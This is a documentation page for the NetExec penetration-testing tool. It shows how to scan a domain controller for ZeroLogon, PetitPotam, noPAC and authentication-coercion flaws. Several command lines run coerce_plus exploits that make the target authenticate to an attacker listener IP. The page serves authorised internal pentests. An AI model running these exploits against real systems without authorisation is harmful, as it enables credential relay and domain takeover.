---
description: Check if a DC is vulnerable
---

# Scan for Vulnerabilities

When you start your internal pentest, these are the first modules you should try:

### ZeroLogon

`nxc smb <ip> -u '' -p '' -M zerologon`

### PetitPotam

`nxc smb <ip> -u '' -p '' -M petitpotam`

### noPAC

`nxc smb <ip> -u 'user' -p 'pass' -M nopac`

{% hint style="warning" %}
You need a credential for this one
{% endhint %}

Or, try them all at once! Just list each one: `-M zerologon -M petitpotam`

# Scan for Coerce Vulnerabilities

You can check for coerce vulnerabilities such as Petitpotam, DFSCoerce, PrinterBug, MSEven, and ShadowCoerce using the coerce_plus module.

`nxc smb <ip> -u '' -p '' -M coerce_plus`

If a vulnerability is found, you can exploit it by using the same coerce_plus module

`nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>`

To run all exploit methods at once, add the ALWAYS=true option

`nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true`

You can also check for a specific coerce method by specifying it

`nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam`

{% hint style="success" %}
Instead of using the METHOD option, you can use its short form M. Similarly, the argument LISTENER can be shortened to L.

This also applies to the names of the vulnerabilities when specifying a method.

M=p // Invalid, as both petitpotam and printerbug start with ‘p’ so modules gives error

M=pr // Matches printerbug

M=pe // Matches petitpotam

M=dfs // Matches dfscoerce

{% endhint %}

Check out what other modules are available via `nxc <protocol> -L`
